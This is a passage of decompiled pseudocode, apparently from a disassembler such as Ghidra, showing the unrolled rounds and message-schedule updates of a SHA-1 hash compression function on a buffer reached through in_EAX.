  uVar1 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar3 = uVar5 + 0x5a827999 +
          ((uVar8 ^ uVar6) & uVar2 ^ uVar8) + (uVar4 >> 0x1b | uVar4 * 0x20) + uVar3;
  uVar2 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x24);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  uVar5 = uVar4 >> 2 | uVar4 * 0x40000000;
  *(uint *)(in_EAX + 0x24) = uVar2;
  uVar2 = uVar8 + 0x5a827999 +
          ((uVar1 ^ uVar6) & uVar4 ^ uVar6) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar2;
  uVar4 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x28);
  uVar4 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x28) = uVar4;
  uVar8 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar6 + 0x5a827999 +
          ((uVar1 ^ uVar5) & uVar3 ^ uVar1) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar4;
  uVar4 = *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x20);
  uVar4 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x2c) = uVar4;
  uVar4 = uVar1 + 0x6ed9eba1 + (uVar5 ^ uVar8 ^ uVar2) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar4;
  uVar1 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x24);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x30) = uVar2;
  uVar2 = uVar5 + 0x6ed9eba1 + (uVar8 ^ uVar1 ^ uVar3) + (uVar4 >> 0x1b | uVar4 * 0x20) + uVar2;
  uVar5 = *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x28);
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar5 << 1 | (uint)((int)uVar5 < 0);
  uVar5 = uVar4 >> 2 | uVar4 * 0x40000000;
  *(uint *)(in_EAX + 0x34) = uVar3;
  uVar3 = uVar8 + 0x6ed9eba1 + (uVar4 ^ uVar1 ^ uVar6) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar3;
  uVar4 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x38) ^
          *(uint *)(in_EAX + 0x2c);
  uVar4 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  uVar8 = uVar2 >> 2 | uVar2 * 0x40000000;
  *(uint *)(in_EAX + 0x38) = uVar4;
  uVar2 = uVar1 + 0x6ed9eba1 + (uVar5 ^ uVar2 ^ uVar6) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar4;
  uVar4 = *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x1c);
  uVar4 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x3c) = uVar4;
  uVar4 = uVar6 + 0x6ed9eba1 + (uVar5 ^ uVar8 ^ uVar3) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar4;
  uVar1 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x20);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x40) = uVar3;
  uVar3 = uVar5 + 0x6ed9eba1 + (uVar8 ^ uVar1 ^ uVar2) + (uVar4 >> 0x1b | uVar4 * 0x20) + uVar3;
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x44) ^
          *(uint *)(in_EAX + 0x24);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x44) = uVar2;
  uVar2 = uVar8 + 0x6ed9eba1 + (uVar1 ^ uVar5 ^ uVar4) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar2;
  uVar8 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x28);
  uVar6 = uVar4 >> 2 | uVar4 * 0x40000000;
  uVar8 = uVar8 << 1 | (uint)((int)uVar8 < 0);
  uVar4 = uVar3 >> 2 | uVar3 * 0x40000000;
  *(uint *)(in_EAX + 0x48) = uVar8;
  uVar3 = uVar1 + 0x6ed9eba1 + (uVar3 ^ uVar5 ^ uVar6) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar8;
  uVar8 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x2c);
  uVar1 = uVar8 << 1 | (uint)((int)uVar8 < 0);
  uVar8 = uVar2 >> 2 | uVar2 * 0x40000000;
  *(uint *)(in_EAX + 0x4c) = uVar1;
  uVar2 = uVar5 + 0x6ed9eba1 + (uVar4 ^ uVar2 ^ uVar6) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar1;
  uVar5 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x44);
  uVar1 = uVar5 << 1 | (uint)((int)uVar5 < 0);
  uVar5 = uVar3 >> 2 | uVar3 * 0x40000000;
  *(uint *)(in_EAX + 0x50) = uVar1;
  uVar3 = uVar6 + 0x6ed9eba1 + (uVar4 ^ uVar8 ^ uVar3) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar1;
  uVar1 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x1c);
  uVar6 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x54) = uVar6;
  uVar1 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = uVar4 + 0x6ed9eba1 + (uVar8 ^ uVar5 ^ uVar2) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar6;
  uVar4 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x20);
  uVar4 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x58) = uVar4;
  uVar4 = uVar8 + 0x6ed9eba1 + (uVar5 ^ uVar1 ^ uVar3) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar4;
  uVar8 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x24);
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar8 << 1 | (uint)((int)uVar8 < 0);
  *(uint *)(in_EAX + 0x1c) = uVar3;
  uVar8 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar3 = uVar5 + 0x6ed9eba1 + (uVar2 ^ uVar1 ^ uVar6) + (uVar4 >> 0x1b | uVar4 * 0x20) + uVar3;
  uVar2 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x28) ^
          *(uint *)(in_EAX + 0x20);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  uVar5 = uVar4 >> 2 | uVar4 * 0x40000000;
  *(uint *)(in_EAX + 0x20) = uVar2;
  uVar2 = uVar1 + 0x6ed9eba1 + (uVar8 ^ uVar4 ^ uVar6) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar2;
  uVar4 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x24);
  uVar4 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x24) = uVar4;
  uVar1 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar6 + 0x6ed9eba1 + (uVar8 ^ uVar5 ^ uVar3) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar4;
  uVar4 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x28);
  uVar4 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x28) = uVar4;
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = uVar8 + 0x6ed9eba1 + (uVar5 ^ uVar1 ^ uVar2) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar4;
  uVar4 = *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x20);
  uVar4 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x2c) = uVar4;
  uVar4 = uVar5 + 0x6ed9eba1 + (uVar1 ^ uVar6 ^ uVar3) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar4;
  uVar5 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x24);
  uVar7 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar5 << 1 | (uint)((int)uVar5 < 0);
  *(uint *)(in_EAX + 0x30) = uVar3;
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar3 = uVar1 + 0x6ed9eba1 + (uVar2 ^ uVar6 ^ uVar7) + (uVar4 >> 0x1b | uVar4 * 0x20) + uVar3;
  uVar2 = *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x28);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x34) = uVar2;
  uVar8 = uVar4 >> 2 | uVar4 * 0x40000000;
  uVar2 = uVar6 + 0x6ed9eba1 + (uVar5 ^ uVar4 ^ uVar7) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar2;
  uVar4 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x38) ^
          *(uint *)(in_EAX + 0x2c);
  uVar1 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x38) = uVar1;
  uVar4 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar6 = *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x1c);
  uVar3 = uVar7 + 0x6ed9eba1 + (uVar5 ^ uVar8 ^ uVar3) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar1;
  uVar6 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x3c) = uVar6;
  uVar1 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x20);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  uVar2 = ((uVar4 ^ uVar2) & uVar8 | uVar4 & uVar2) + uVar6 + uVar5 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  *(uint *)(in_EAX + 0x40) = uVar7;
  uVar5 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar6 = *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x44) ^
          *(uint *)(in_EAX + 0x24);
  uVar3 = ((uVar1 ^ uVar3) & uVar4 | uVar1 & uVar3) + uVar7 + uVar8 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar8 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x44) = uVar8;
  uVar6 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x28);
  uVar4 = ((uVar2 ^ uVar5) & uVar1 | uVar2 & uVar5) + uVar8 + uVar4 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar7 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x48) = uVar2;
  uVar8 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar6 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x2c);
  uVar3 = ((uVar7 ^ uVar3) & uVar5 | uVar7 & uVar3) + uVar2 + uVar1 + -0x70e44324 +
          (uVar4 >> 0x1b | uVar4 * 0x20);
  uVar2 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x4c) = uVar2;
  uVar1 = uVar4 >> 2 | uVar4 * 0x40000000;
  uVar2 = ((uVar8 ^ uVar4) & uVar7 | uVar8 & uVar4) + uVar2 + uVar5 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar4 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x44);
  uVar4 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x50) = uVar4;
  uVar5 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar6 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x1c);
  uVar3 = ((uVar1 ^ uVar3) & uVar8 | uVar1 & uVar3) + uVar4 + uVar7 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar4 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x54) = uVar4;
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x20);
  uVar2 = ((uVar5 ^ uVar2) & uVar1 | uVar5 & uVar2) + uVar4 + uVar8 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar4 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x58) = uVar4;
  uVar8 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x24);
  uVar4 = ((uVar3 ^ uVar6) & uVar5 | uVar3 & uVar6) + uVar4 + uVar1 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar7 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar8 << 1 | (uint)((int)uVar8 < 0);
  *(uint *)(in_EAX + 0x1c) = uVar3;
  uVar8 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar3 = ((uVar7 ^ uVar2) & uVar6 | uVar7 & uVar2) + uVar3 + uVar5 + -0x70e44324 +
          (uVar4 >> 0x1b | uVar4 * 0x20);
  uVar2 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x28) ^
          *(uint *)(in_EAX + 0x20);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x20) = uVar2;
  uVar5 = uVar4 >> 2 | uVar4 * 0x40000000;
  uVar1 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x24);
  uVar2 = ((uVar8 ^ uVar4) & uVar7 | uVar8 & uVar4) + uVar2 + uVar6 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x24) = uVar1;
  uVar6 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x28);
  uVar4 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = ((uVar5 ^ uVar3) & uVar8 | uVar5 & uVar3) + uVar1 + uVar7 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar6 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x28) = uVar6;
  uVar1 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x20);
  uVar2 = ((uVar4 ^ uVar2) & uVar5 | uVar4 & uVar2) + uVar6 + uVar8 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar8 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x2c) = uVar8;
  uVar6 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x24);
  uVar7 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = ((uVar3 ^ uVar1) & uVar4 | uVar3 & uVar1) + uVar8 + uVar5 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar8 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x30) = uVar8;
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = ((uVar7 ^ uVar2) & uVar1 | uVar7 & uVar2) + uVar8 + uVar4 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar4 = *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x28);
  uVar8 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x34) = uVar8;
  uVar4 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar6 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x38) ^
          *(uint *)(in_EAX + 0x2c);
  uVar3 = ((uVar5 ^ uVar3) & uVar7 | uVar5 & uVar3) + uVar8 + uVar1 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar1 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x38) = uVar1;
  uVar6 = *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x1c);
  uVar8 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = ((uVar4 ^ uVar2) & uVar5 | uVar4 & uVar2) + uVar1 + uVar7 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar6 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x3c) = uVar6;
  uVar1 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x20);
  uVar3 = ((uVar8 ^ uVar3) & uVar4 | uVar8 & uVar3) + uVar6 + uVar5 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar5 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x40) = uVar5;
  uVar4 = ((uVar2 ^ uVar1) & uVar8 | uVar2 & uVar1) + uVar5 + uVar4 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar7 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x44) ^
          *(uint *)(in_EAX + 0x24);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x44) = uVar2;
  uVar5 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar6 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x28);
  uVar3 = ((uVar7 ^ uVar3) & uVar1 | uVar7 & uVar3) + uVar2 + uVar8 + -0x70e44324 +
          (uVar4 >> 0x1b | uVar4 * 0x20);
  uVar2 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x48) = uVar2;
  uVar6 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x2c);
  uVar8 = uVar4 >> 2 | uVar4 * 0x40000000;
  uVar2 = ((uVar5 ^ uVar4) & uVar7 | uVar5 & uVar4) + uVar2 + uVar1 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar4 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x4c) = uVar4;
  uVar6 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x44);
  uVar1 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = (uVar5 ^ uVar8 ^ uVar3) + uVar4 + uVar7 + -0x359d3e2a + (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar4 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x50) = uVar4;
  uVar7 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x1c);
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = (uVar8 ^ uVar1 ^ uVar2) + uVar4 + uVar5 + -0x359d3e2a + (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar4 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x54) = uVar4;
  uVar4 = (uVar3 ^ uVar1 ^ uVar6) + uVar4 + uVar8 + -0x359d3e2a + (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar7 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x20);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x58) = uVar3;
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar8 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x24);
  uVar3 = (uVar7 ^ uVar2 ^ uVar6) + uVar3 + uVar1 + -0x359d3e2a + (uVar4 >> 0x1b | uVar4 * 0x20);
  uVar2 = uVar8 << 1 | (uint)((int)uVar8 < 0);
  *(uint *)(in_EAX + 0x1c) = uVar2;
  uVar8 = uVar4 >> 2 | uVar4 * 0x40000000;
  uVar2 = (uVar7 ^ uVar5 ^ uVar4) + uVar2 + uVar6 + -0x359d3e2a + (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar4 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x28) ^
          *(uint *)(in_EAX + 0x20);
  uVar4 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x20) = uVar4;
  uVar6 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x24);
  uVar1 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = (uVar5 ^ uVar8 ^ uVar3) + uVar4 + uVar7 + -0x359d3e2a + (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar4 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x24) = uVar4;
  uVar7 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x28);
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = (uVar8 ^ uVar1 ^ uVar2) + uVar4 + uVar5 + -0x359d3e2a + (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar4 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x28) = uVar4;
  uVar4 = (uVar3 ^ uVar1 ^ uVar6) + uVar4 + uVar8 + -0x359d3e2a + (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar5 = *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x20);
  uVar7 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar5 << 1 | (uint)((int)uVar5 < 0);
  *(uint *)(in_EAX + 0x2c) = uVar3;
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar3 = (uVar7 ^ uVar2 ^ uVar6) + uVar3 + uVar1 + -0x359d3e2a + (uVar4 >> 0x1b | uVar4 * 0x20);
  uVar2 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x24);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x30) = uVar2;
  uVar1 = *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x28);
  uVar8 = uVar4 >> 2 | uVar4 * 0x40000000;
  uVar2 = (uVar7 ^ uVar5 ^ uVar4) + uVar2 + uVar6 + -0x359d3e2a + (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar4 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x34) = uVar4;
  uVar6 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x38) ^
          *(uint *)(in_EAX + 0x2c);
  uVar1 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = (uVar5 ^ uVar8 ^ uVar3) + uVar4 + uVar7 + -0x359d3e2a + (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar4 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x38) = uVar4;
  uVar7 = *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x1c);
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = (uVar8 ^ uVar1 ^ uVar2) + uVar4 + uVar5 + -0x359d3e2a + (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar4 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x3c) = uVar4;
  uVar4 = (uVar3 ^ uVar1 ^ uVar6) + uVar4 + uVar8 + -0x359d3e2a + (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar5 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x20);
  uVar7 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar8 = uVar5 << 1 | (uint)((int)uVar5 < 0);
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
